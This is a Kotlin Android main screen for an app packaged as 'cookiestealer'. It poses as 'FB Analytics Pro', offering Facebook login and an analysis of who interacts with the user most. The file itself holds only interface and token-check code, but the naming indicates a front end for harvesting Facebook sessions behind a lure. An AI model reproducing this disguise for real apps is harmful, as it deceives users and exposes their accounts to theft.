package com.example.cookiestealer

import android.content.Intent
import android.os.Bundle
import android.view.animation.AnimationUtils
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var btnLogin: Button
    private lateinit var tvTitle: TextView
    private lateinit var tvDescription: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        initViews()
        checkLoginStatus()
        startAnimations()

        btnLogin.setOnClickListener {
            animateButtonClick(it)
            it.postDelayed({
                val intent = if (isLoggedIn()) {
                    Intent(this, AnalysisActivity::class.java)
                } else {
                    Intent(this, LoginActivity::class.java)
                }
                startActivity(intent)
            }, 200)
        }
    }

    override fun onResume() {
        super.onResume()
        checkLoginStatus()
    }

    private fun initViews() {
        btnLogin = findViewById(R.id.btnLogin)
        tvTitle = findViewById(R.id.tvTitle)
        tvDescription = findViewById(R.id.tvDescription)
        
        // Setup social links
        findViewById<TextView>(R.id.tvFacebookLink).setOnClickListener {
            openUrl("https://fb.com/duydat141207")
        }
        
        findViewById<TextView>(R.id.tvGithubLink).setOnClickListener {
            openUrl("https://github.com/duydat1412")
        }
    }

    private fun startAnimations() {
        // Animate title
        tvTitle.alpha = 0f
        tvTitle.animate()
            .alpha(1f)
            .setDuration(800)
            .setStartDelay(100)
            .start()

        // Animate description card (tìm parent CardView)
        val descriptionCard = findViewById<androidx.cardview.widget.CardView>(
            (tvDescription.parent.parent as? androidx.cardview.widget.CardView)?.id
            ?: android.R.id.content
        )
        val fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in)
        descriptionCard?.startAnimation(fadeIn)

        // Animate button
        btnLogin.alpha = 0f
        btnLogin.translationY = 50f
        btnLogin.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(600)
            .setStartDelay(300)
            .start()
    }

    private fun animateButtonClick(view: android.view.View) {
        val animation = AnimationUtils.loadAnimation(this, R.anim.button_click_animation)
        view.startAnimation(animation)
    }

    private fun isLoggedIn(): Boolean {
        val prefs = getSharedPreferences("FBAnalyzer", MODE_PRIVATE)
        return prefs.getString("access_token", null) != null
    }

    private fun checkLoginStatus() {
        val prefs = getSharedPreferences("FBAnalyzer", MODE_PRIVATE)
        val accessToken = prefs.getString("access_token", null)
        val userName = prefs.getString("user_name", "")

        if (accessToken != null) {
            // Đã đăng nhập
            btnLogin.text = "XEM PHÂN TÍCH"
            tvTitle.text = "Xin chào, $userName!"
            tvDescription.text = "Bấm nút để xem ai tương tác nhiều nhất với bạn"
        } else {
            // Chưa đăng nhập
            btnLogin.text = "ĐĂNG NHẬP VỚI FACEBOOK"
            tvTitle.text = "FB Analytics Pro"
            tvDescription.text = "Phân tích sâu về bạn bè"
        }
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}